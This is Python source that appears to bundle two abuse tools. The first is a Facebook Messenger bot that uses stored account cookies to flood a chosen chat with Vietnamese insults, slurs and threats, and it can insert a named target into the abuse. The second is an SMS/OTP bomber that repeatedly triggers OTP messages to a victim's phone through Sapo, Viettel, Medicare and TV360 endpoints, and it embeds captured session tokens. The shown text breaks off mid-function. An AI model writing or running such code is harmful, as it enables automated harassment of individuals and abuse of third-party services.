"sua de", "cam a", "hang de", "s da", "sợ à m", "toc do ba", " speed dei" , "cham da ba", "phế a m", "bia a m", "sua đi m", "con ngu", "cay à ba", "m phèn ma", "choi ik m", "dg cau cuu a ba", " chậm à", "anh bá mà m", "sua de","cn mm","sao ay", "sua de","cay a","maude","nhanh de","sao doa","le de","cay a","sao ay","sua di m","cay a","djt me m","con mm","hang de em","moi tay am","duoi aak","duoi ke","clm m","cay t ak","speed m","sua de","gay a","yeu ak","met ak","phe kk","nhanh dei","ga ak","bede ak","sua de","cay ak","nhanh len","cham ak m","sao da","mau di m","sua hang kg","phe ak","sua de","nhanh de ","hang de","mau de","gay a","bede ak","dit mm","dua de","cay vl ak","sua mau de","nhanh len","nhanh kg" ,"sao da","o ke","cham da","t nhanh vvl","lien tuc dei","dua du","toc do de","sua de","le de","cay ak m","sua de m","sua chay di","con cho","ga ak cn","bia a","con cho ngu","soeed di m","dien me r","so ak","so ke","cay","chay ak","gay ke","clm m","akaka","cn mm","chill di","sua du","nhanh m","ga ak","tk cac",
]

# ===== MÀU =====
RESET = "\033[0m"
BOLD_ITALIC = "\033[1;3m"

trang = "\033[1;37m"
xanh_la = "\033[1;32m"
xanh_cyan_dam = '\033[38;5;51m'
xanhnhat = "\033[1;34m"
do = "\033[1;31m"
xam = '\033[1;30m'
vang = "\033[1;33m"
tim = "\033[1;35m"

def print_banner():
    print(f"{do}{BOLD_ITALIC}⚔️ TOOL : BOT WAR MESS{RESET}")
    print(f"{vang}{BOLD_ITALIC}👑 Admin   : DucMinhIOS{RESET}")
    print(f"{xanh_la}{BOLD_ITALIC}🌐 Facebook: Duc Minhh{RESET}")
    print(f"{tim}{BOLD_ITALIC}✈️  Tele    : @minhiosfefe{RESET}")

class Messenger:
    def __init__(self, cookie):
        self.cookie = cookie
        self.user_id = self.get_user_id()
        self.fb_dtsg = None
        self.init_params()

    def get_user_id(self):
        try:
            return re.search(r"c_user=(\d+)", self.cookie).group(1)
        except:
            raise Exception("Cookie không hợp lệ")

    def init_params(self):
        headers = {
            'Cookie': self.cookie,
            'User-Agent': 'Mozilla/5.0'
        }
        try:
            for url in ['https://www.facebook.com', 'https://mbasic.facebook.com', 'https://m.facebook.com']:
                response = requests.get(url, headers=headers)
                match = re.search(r'name="fb_dtsg" value="(.*?)"', response.text)
                if match:
                    self.fb_dtsg = match.group(1)
                    return
            raise Exception("Không tìm thấy fb_dtsg")
        except Exception as e:
            raise Exception(f"Lỗi khởi tạo: {str(e)}")

    def send_message(self, recipient_id, message):
        timestamp = int(time.time() * 1000)
        data = {
            'fb_dtsg': self.fb_dtsg,
            '__user': self.user_id,
            'body': message,
            'action_type': 'ma-type:user-generated-message',
            'timestamp': timestamp,
            'offline_threading_id': str(timestamp),
            'message_id': str(timestamp),
            'thread_fbid': recipient_id,
            'source': 'source:chat:web',
            'client': 'mercury'
        }
        headers = {
            'Cookie': self.cookie,
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.post('https://www.facebook.com/messaging/send/', data=data, headers=headers)
            return response.status_code == 200
        except:
            return False

def send_messages_thread(messenger, recipient_id, message_list, delay):
    while True:
        raw_entry = random.choice(message_list)
        parts = [m.strip() for m in raw_entry.split(',') if m.strip()]
        for message in parts:
            success = messenger.send_message(recipient_id, message)
            status = "THÀNH CÔNG" if success else "THẤT BẠI"
            if success:
                status_text = f"{xanh_la}[THÀNH CÔNG]{trang}"
            else:
                status_text = f"{do}[THẤT BẠI]{trang}"

            print(f"{status_text} {xanhnhat}Cookie {messenger.user_id}{trang} gửi tới box: {xanh_cyan_dam}{recipient_id}{trang} | Nội dung: {vang}{message}{trang}")

            time.sleep(delay)

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()

    # box
    box_file = "saved_boxes.txt"
    print(f"\n{xanh_la}Chọn ID box:{xanh_cyan_dam}")
    print(f"{xanh_cyan_dam}1. Nhập ID box mới")
    print(f"{xanh_cyan_dam}2. Sử dụng ID box đã lưu")
    box_choice = input(f"{vang}Lựa chọn (1-2): {xanh_cyan_dam}").strip()

    if box_choice == '1':
        recipient_id = input(f"{vang}Nhập ID box mới: {xanh_cyan_dam}").strip()
        if not recipient_id:
            print(f"{do}ID box không được để trống.{xanh_cyan_dam}")
            return
        with open(box_file, "a", encoding="utf-8") as f:
            f.write(recipient_id + "\n")
    elif box_choice == '2':
        if not os.path.exists(box_file):
            print(f"{do}Chưa có ID box nào được lưu.{xanh_cyan_dam}")
            return
        with open(box_file, "r", encoding="utf-8") as f:
            boxes = [line.strip() for line in f if line.strip()]
        if not boxes:
            print(f"{do}Danh sách trống.{xanh_cyan_dam}")
            return
        print(f"\n{xanh_la}Sử dụng ID box đã lưu:{xanh_cyan_dam}")
        for idx, b in enumerate(boxes, 1):
            print(f"{xanh_cyan_dam}{idx}. {b}")
        try:
            choice = int(input(f"{vang}Nhập lựa chọn: {xanh_cyan_dam}"))
            recipient_id = boxes[choice - 1]
        except:
            print(f"{do}Lựa chọn không hợp lệ.{xanh_cyan_dam}")
            return
    else:
        print(f"{do}Lựa chọn không hợp lệ.{xanh_cyan_dam}")
        return

    # cookie
    cookie_file = "saved_cookies.txt"
    cookies = []

    print(f"\n{xanh_la}Chọn cookie:{xanh_cyan_dam}")
    print(f"{xanh_cyan_dam}1. Thêm cookie mới")
    print(f"{xanh_cyan_dam}2. Sử dụng cookie đã lưu")
    cookie_choice = input(f"{vang}Lựa chọn (1-2): {xanh_cyan_dam}").strip()

    if cookie_choice == '1':
        try:
            num_cookies = int(input(f"{vang}Nhập số lượng cookie muốn sử dụng: {xanh_cyan_dam}"))
            if num_cookies <= 0:
                print(f"{do}Số lượng cookie phải lớn hơn 0.{xanh_cyan_dam}")
                return
        except ValueError:
            print(f"{do}Vui lòng nhập một số hợp lệ.{xanh_cyan_dam}")
            return

        for i in range(num_cookies):
            name = input(f"{xanh_cyan_dam}Tên người dùng {i+1}:{xanh_cyan_dam} ").strip()
            c = input(f"{vang}Cookie {i+1}:{xanh_cyan_dam} ").strip()
            if not name or not c:
                print(f"{do}Không được để trống.{xanh_cyan_dam}")
                return
            cookies.append(c)
            with open(cookie_file, "a", encoding="utf-8") as f:
                f.write(f"{name} | {c}\n")
    elif cookie_choice == '2':
        if not os.path.exists(cookie_file):
            print(f"{do}Chưa có cookie nào được lưu.{xanh_cyan_dam}")
            return
        with open(cookie_file, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if "|" in line]
        if not lines:
            print(f"{do}Không có cookie hợp lệ.{xanh_cyan_dam}")
            return
        print(f"\n{xanh_la}Sử dụng tài khoản:{xanh_cyan_dam}")
        for idx, line in enumerate(lines, 1):
            name, _ = line.split("|", 1)
            print(f"{xanh_cyan_dam}{idx}. {name.strip()}")
        try:
            selected = input(f"{vang}Nhập lựa chọn (1 hoặc nhiều số, cách nhau bởi ','): {xanh_cyan_dam}").strip()
            indexes = [int(i)-1 for i in selected.split(",") if i.strip().isdigit()]
            for i in indexes:
                _, ck = lines[i].split("|", 1)
                cookies.append(ck.strip())
        except:
            print(f"{do}Lỗi khi chọn tài khoản.{xanh_cyan_dam}")
            return
    else:
        print(f"{do}Lựa chọn không hợp lệ.{xanh_cyan_dam}")
        return

    messengers = []
    for i, cookie in enumerate(cookies, 1):
        try:
            m = Messenger(cookie)
            messengers.append(m)
            print(f"{xanh_la}Cookie {i}: OK - User ID: {m.user_id}{xanh_cyan_dam}")
        except Exception as e:
            print(f"{do}Cookie {i}: Lỗi - {e}{xanh_cyan_dam}")

    if not messengers:
        print(f"{do}Không có cookie hợp lệ.{xanh_cyan_dam}")
        return

    try:
        delay = float(input(f"{vang}Delay giữa mỗi lần gửi (giây): {xanh_cyan_dam}"))
    except:
        delay = 5

    print(f"\n{xanh_la}Chọn kiểu nội dung tin nhắn:{xanh_cyan_dam}")
    print(f"{xanh_cyan_dam}1. Nhây có dấu\n2. Nhây không dấu\n3. Nhây réo tên\n4. Tự nhập nội dung muốn gửi")
    choice = input(f"{vang}Nhập lựa chọn (1-4): {xanh_cyan_dam}").strip()

    if choice == '1':
        message_list = CAU_CHUI_1
    elif choice == '2':
        message_list = CAU_CHUI_2
    elif choice == '3':
        chon_name = input(f"{vang}Nhập tên cần réo: {xanh_cyan_dam}").strip()
        if not chon_name:
            print(f"{do}Tên không được để trống.{xanh_cyan_dam}")
            return
        message_list = [
f"sua di {chon_name}",
f"co len con {chon_name}",
f"son hang len em {chon_name}",
f"sao m yeu v {chon_name} ",
f"co ti nua {chon_name}",
f"sao kia cham a {chon_name}",
f"hang hai len ti chu {chon_name}",
f"toi sang di {chon_name}",
f"co gang ti con cho {chon_name}",
f"yeu v con {chon_name}",
f"con cho {chon_name} co de",
f"sao m cam kia {chon_name}",
f"ga v {chon_name}",
f"may so a k dam chat hang ak {chon_name}",
f"m ga ma {chon_name}",
f"may ngu ro ma {chon_name}",
f"con {chon_name} an hai ma",
f"cai cun ak {chon_name}",
f"may con gi khac ko vay {chon_name}",
f"hoc dot nen nhay dot ak {chon_name}",
f"co ti di em {chon_name}",
f"meu a {chon_name}",
f"sao meu kia {chon_name}",
f"tao da cho m meu dau {chon_name}",
f"va le di con {chon_name} dot",
f"sao kia {chon_name}",
f"tu bo r a {chon_name}",
f"manh me ti di con {chon_name}",
f"co len con cho {chon_name} ngu",
f"😆 cay tao a con di {chon_name}",
f"so tao a {chon_name}",
f"sao cham roi kia {chon_name}",
f"cay lam phai kh {chon_name}",
f"{chon_name} ot anh cmnr",
f"may con choi a {chon_name}",
f"lam ti keo de {chon_name}",
f"moi do da met r ha {chon_name}",
f"sao ga ma son v {chon_name}",
f"son nhu luc dau cho tao di con {chon_name} dot",
f"sao duoi roi kia {chon_name}",
f"ai cho m nhai vay {chon_name}",
f"cay lam r a {chon_name}",
f"tu bo di em {chon_name}",
f"may nghi may lam t cay dc ha {chon_name}",
f"m dang cay ma {chon_name}",
f"tao dang hanh m ma {chon_name}",
f"keo nhay kg ay {chon_name}",
f"con mo coi {chon_name}",
f"co len {chon_name} oc cho",
f"hang tiep di {chon_name}",
f"toi sang k em {chon_name}",
f"met roi ha {chon_name}",
f"speed ti dc ko {chon_name}",
f"m ga ma {chon_name}",
f"thay phien a {chon_name}",
f"tui anh thay phien ban vo loz me con {chon_name} ma kaka",
f"so tao a con cho {chon_name}",
f"anh win me roi {chon_name} dot",
f"ga ma hay the hien ha {chon_name}",
f"con mo coi {chon_name} keo cai ko em",
f"co len de {chon_name}",
f"sao moi 1 ti ma da cam roi {chon_name}",
f"yeu vay ak {chon_name}",
f"sao kia {chon_name}",
f"bat luc r ak {chon_name}",
f"tim cach roi ha {chon_name}",
f"ai cuu dc m a :)) {chon_name}",
f"anh ba cmnr ma {chon_name}",
f"sao m ga vay {chon_name}",
f"hang le cho tao di {chon_name}",
f"con mo coi {chon_name}",
f"on k em {chon_name}",
f"bat on roi a {chon_name}",
f"may oc a con cho {chon_name}",
f"me may ngu a {chon_name}",
f"bu cac cha m k em {chon_name}",
f"mo coi {chon_name} cay anh ha",
f"me m dot tu roi a {chon_name}",
f"phe vay {chon_name}",
f"m on k {chon_name}",
f"mo coi kia {chon_name}",
f"sao v so r a {chon_name}",
f"co gang ti em {chon_name}",
f"cay cu lam r ha {chon_name}",
f"dien dai di em {chon_name}",
f"chay nuoc dai bo r a em {chon_name}",
f"sao kia dung so anh ma {chon_name}",
f"may run a:)) {chon_name}",
f"thg {chon_name} mo coi",
f"cay tao lam ha {chon_name}",
f"lgbt len phim ngu ak em {chon_name}",
f"thg cac giet cha mang me {chon_name}",
f"sua manh eii {chon_name}",
f"may chet r a:)) {chon_name}",
f"sao chet kia {chon_name}",
f"bi t hanh nen muon chet a {chon_name}",
f"con {chon_name} loz ngu kaka",
f"sao kia {chon_name}",
f"manh len kia {chon_name}",
f"yeu sinh ly a {chon_name}",
f"sua de {chon_name}",
f"cay a {chon_name}",
f"hang de {chon_name}",
f"con ga {chon_name}",
f"phe vat {chon_name}",
f"oc cho {chon_name}",
f"me m bi t du hap hoi kia con {chon_name}",
f"on ko em {chon_name}",
f"bat on ak {chon_name}",
f"o kiaaa sao vayy {chon_name}",
f"hang hai de {chon_name}",
f"chay ak {chon_name}",
f"so ak {chon_name}",
f"quiu luon roi ak {chon_name}",
f"may dot ak {chon_name}",
f"cac ngu {chon_name}",
f"chay de {chon_name}",
f"chat hang len {chon_name}",
f"co len {chon_name}",
f"{chon_name} mo coi",
f"cn cho ngu {chon_name}",
f"oc cac {chon_name}",
f"di du {chon_name}",
f"du kia {chon_name}",
f"cun v {chon_name}",
f"r luon con {chon_name} bi ngu roi",
f"met r am {chon_name}",
f"kkakak",
f"sao du {chon_name}",
f"cac con {chon_name}",
f"ngu kia {chon_name}",
f"chat manh de {chon_name}",
f"hang ee {chon_name}",
f"clm thk oc cho {chon_name}",
f"sua chay de {chon_name}",
f"sua manh eei {chon_name}",
f"may oc a con {chon_name}",
f"tao cho m chay a {chon_name}",
f"con mo coi {chon_name}",
f"may chay a con di lon {chon_name}",
f"sua de {chon_name}",
f"con phen {chon_name}",
f"bat on ho {chon_name}",
f"s do  {chon_name}",
f"sua lien tuc de {chon_name}",
f"moi tay ak {chon_name}",
f"choi t giet cha ma m ne {chon_name}",
f"hang xiu de {chon_name}",
f"th ngu {chon_name}",
f"len daica bieu ne {chon_name}",
f"sua chill de {chon_name}",
f"m thich du ko da {chon_name}",
f"son hang dc kg {chon_name}",
f"cam chay nhen {chon_name}",
f"m mau de {chon_name}",
f"duoi ak {chon_name}",
f"th ngu {chon_name}",
f"con {chon_name} len day anh sut chet me may",
f"m khoc ak {chon_name}",
f"sua lien tuc de {chon_name}",
f"thg {chon_name} cho dien",
f"bi ngu ak {chon_name}",
f"speed de {chon_name}",
f"cham v cn culi {chon_name}",
f"hoang loan ak {chon_name}",
f"bat on ak {chon_name}",
f"run ak {chon_name}",
f"chay ak {chon_name}",
f"duoi ak {chon_name}",
f"met r ak {chon_name}",
f"sua mau {chon_name}",
f"manh dan len {chon_name}",
f"nhanh t cho co hoi cuu ma m ne {chon_name}",
f"cam mach me nha {chon_name}",
f"ao war ak {chon_name}",
f"tk {chon_name} dot v ak",
f"cham chap ak {chon_name}",
f"th cho bua m sao v {chon_name}",
f"th dau buoi mat cho {chon_name}",
f"cam hoang loan ma {chon_name}",
]
    elif choice == '4':
        custom = input(f"{vang}Nhập nội dung (các câu cách nhau bằng dấu ','): {xanh_cyan_dam}").strip()
        if not custom:
            print(f"{do}Nội dung không được để trống.{xanh_cyan_dam}")
            return
        message_list = [custom]
    else:
        print(f"{do}Lựa chọn không hợp lệ.{xanh_cyan_dam}")
        return

    print(f"\n{xanh_la}=== BẮT ĐẦU GỬI ==={xanh_cyan_dam}")
    threads = []
    for messenger in messengers:
        t = threading.Thread(target=send_messages_thread, args=(messenger, recipient_id, message_list, delay))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{do}Dừng chương trình...{xanh_cyan_dam}")
        os._exit(0)


if __name__ == "__main__":
    main()

# === END TOOL 1 ===
"""

# ===== DÁN CODE TOOL 2 =====
TOOL35_CODE = r"""
# === BEGIN TOOL SPAM  ===

import requests
import time
import json
import sys
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from requests.exceptions import ConnectionError, Timeout, RequestException

from threading import BoundedSemaphore
MAX_THREADS = 200000009000
from requests.packages.urllib3.exceptions import InsecureRequestWarning


import traceback

# Vô hiệu hóa cảnh báo bảo mật
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import logging
import requests

import os

import os

# Xóa màn hình
os.system('cls' if os.name == 'nt' else 'clear')

# Mã màu ANSI
RESET = "\033[0m"
BOLD_ITALIC = "\033[1;3m"
COLORS = [
    "\033[91m",  # Đỏ
    "\033[93m",  # Vàng
    "\033[92m",  # Xanh lá
    "\033[96m",  # Cyan
    "\033[94m",  # Xanh dương
    "\033[95m",  # Tím
]

# Banner
print("\033[1;34m========================================\033[0m")
print(f"{COLORS[0]}{BOLD_ITALIC}👑 Admin   : DucMinhIOS{RESET}")
print(f"{COLORS[1]}{BOLD_ITALIC}🌐 Facebook: Duc Minhh{RESET}")
print("\033[1;34m========================================\033[0m")

print(f"{COLORS[2]}{BOLD_ITALIC}🚀 SPAM SMS{RESET}")
print("\033[0m")  # Reset màu
print(f"{COLORS[3]}{BOLD_ITALIC}👉 Tắt tool bấm Ctrl + C 2 lần{RESET}")





# Vô hiệu hóa logging của requests và urllib3
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# Nếu muốn tắt hoàn toàn log, sử dụng dòng sau
logging.getLogger("requests").propagate = False
logging.getLogger("urllib3").propagate = False

semaphore = BoundedSemaphore(MAX_THREADS)
# Danh sách các họ, tên đệm và tên phổ biến
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

# Tạo tên ngẫu nhiên
def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''  # Optional middle name
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()


def generate_random_id():
    def random_segment(length):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"

def generate_random_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)


#//////////////////////////

def send_otp_via_sapo(sdt):
    cookies = {
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/30/2024 16:21:32',
        'lang': 'vi',
        'G_ENABLED_IDPS': 'google',
        'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'referral': 'https://accounts.sapo.vn/',
        'pageview': '7',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        'phonenumber': sdt,
    }

    response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
    print('thành Công') #("Sapo OTP response:", response.text)

#           _          _     _            _ 
#          (_)        | |   | |          | |
#  __   __  _    ___  | |_  | |_    ___  | |
#  \ \ / / | |  / _ \ | __| | __|  / _ \ | |
#   \ V /  | | |  __/ | |_  | |_  |  __/ | |
#    \_/   |_|  \___|  \__|  \__|  \___| |_|
#                                           
#   https://viettel.vn                                        
def send_otp_via_viettel(sdt):
    cookies = {
        'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
        'redirectLogin': 'https://viettel.vn/myviettel',
        'XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
        'typeCode': 'DI_DONG',
        'actionCode': 'myviettel://login_mobile',
        'type': 'otp_login',
    }

    response = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
    print('thành Công') #("Viettel OTP response:", response.text)









#     https://medicare.vn                                          
#                         | | (_)                             
#   _ __ ___     ___    __| |  _    ___    __ _   _ __    ___ 
#  | '_ ` _ \   / _ \  / _` | | |  / __|  / _` | | '__|  / _ \
#  | | | | | | |  __/ | (_| | | | | (__  | (_| | | |    |  __/
#  |_| |_| |_|  \___|  \__,_| |_|  \___|  \__,_| |_|     \___|
                                                        



def send_otp_via_medicare(sdt):
    cookies = {
        'SERVER': 'nginx2',
        '_gcl_au': '1.1.481698065.1722327865',
        '_tt_enable_cookie': '1',
        '_ttp': 'sCpx7m_MUB9D7tZklNI1kEjX_05',
        '_gid': 'GA1.2.1931976026.1722327868',
        '_ga_CEMYNHNKQ2': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_8DLTVS911W': 'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_R7XKMTVGEW': 'GS1.1.1722327866.1.1.1722327876.50.0.0',
        '_ga': 'GA1.2.535777579.1722327867',
        'XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; _gcl_au=1.1.481698065.1722327865; _tt_enable_cookie=1; _ttp=sCpx7m_MUB9D7tZklNI1kEjX_05; _gid=GA1.2.1931976026.1722327868; _ga_CEMYNHNKQ2=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_8DLTVS911W=GS1.1.1722327866.1.1.1722327876.0.0.0; _ga_R7XKMTVGEW=GS1.1.1722327866.1.1.1722327876.50.0.0; _ga=GA1.2.535777579.1722327867; XSRF-TOKEN=eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'X-XSRF-TOKEN': 'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
    print('thành Công') #("Viettel OTP medicare:", response.text)



def send_otp_via_tv360(sdt):

    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'session-id': 's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
        'device-id': 's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
        'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM; device-id=s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg; shared-device-id=web_89c04dba-075e-49fe-b218-e33aef99dd12; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google',
        'dnt': '1',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
